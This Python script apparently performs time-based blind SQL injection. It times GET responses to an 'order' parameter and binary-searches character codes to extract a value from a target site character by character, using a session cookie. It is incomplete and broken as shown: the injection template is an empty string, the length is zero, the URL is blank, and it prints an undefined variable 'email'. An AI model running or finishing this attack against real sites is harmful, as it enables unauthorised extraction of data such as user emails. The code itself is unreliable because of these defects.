import requests
from bs4 import BeautifulSoup
import time

cookie = {'PHPSESSID':'yourID'}
url = '' # TARGET

def req(str1):
    r = requests.request('GET', url, cookies=cookie, params={'order':str1})
    return r

def injector(injectStr): # Return Beautiful Soup Object After Injection
    r = req(injectStr)
    print('injectStr =>', injectStr)
    beauti = BeautifulSoup(r.text, 'html.parser')
    return beauti

def checkRuntime(injection):
    start = time.time()
    beauti = injector(injection)
    return int(time.time()-start)

def BinarySearchInjection(idx):
    frame = ''

    head=0
    trail=127

    while(head<=trail):
        mid = (head+trail)//2

        injection = (frame % (idx,'=',mid))
        runtime = checkRuntime(injection)
        if runtime>=2:
            return chr(mid)
        else:
            injection = (frame % (idx,'<', mid))
            runtime = checkRuntime(injection)

            if runtime>=2:
                trail = mid-1
            else:
                head = mid+1

guess=''
len = 0 ###

for i in range(1,len+1):
    guess+=BinarySearchInjection(i)

print('guessed val:',email)